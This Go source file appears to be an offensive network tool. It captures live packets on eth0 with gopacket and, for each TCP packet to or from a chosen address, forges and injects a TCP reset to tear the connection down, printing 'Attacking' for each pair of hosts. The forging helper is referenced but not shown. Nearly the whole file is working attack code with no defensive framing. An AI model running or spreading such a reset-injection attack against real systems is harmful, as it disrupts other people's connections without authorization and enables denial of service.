package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	parseFlags()
	// Exit on invalid parameters
	flagsComplete, errString := flagsComplete()
	if !flagsComplete {
		fmt.Println(errString)
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Open connection
	handle, err := pcap.OpenLive(
		"eth0", // network device
		int32(65535),
		false,
		time.Millisecond,
	)
	if err != nil {
		fmt.Println("Handler error", err.Error())
	}

	//Close when done
	defer handle.Close()

	//Capture Live Traffic
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer != nil {
			tcpLayer := packet.Layer(layers.LayerTypeTCP)
			tcp, _ := tcpLayer.(*layers.TCP)
			ip, _ := ipLayer.(*layers.IPv4)
			if tcpLayer != nil {
				if ip.SrcIP.Equal(net.ParseIP(srcAddress)) || ip.DstIP.Equal(net.ParseIP(srcAddress)) {
					if tcp.RST || tcp.FIN {
						continue
					}
					resetPacket := forgeReset(packet)
					fmt.Printf("Attacking %s and %s\n", ip.SrcIP, ip.DstIP)

					if err := handle.WritePacketData(resetPacket.Data()); err != nil {
						fmt.Println("Send error", err.Error())
					}
				}
			}
		} else {
			break //Comment this if you want to use this script as an infinite loop
		}
	}
}
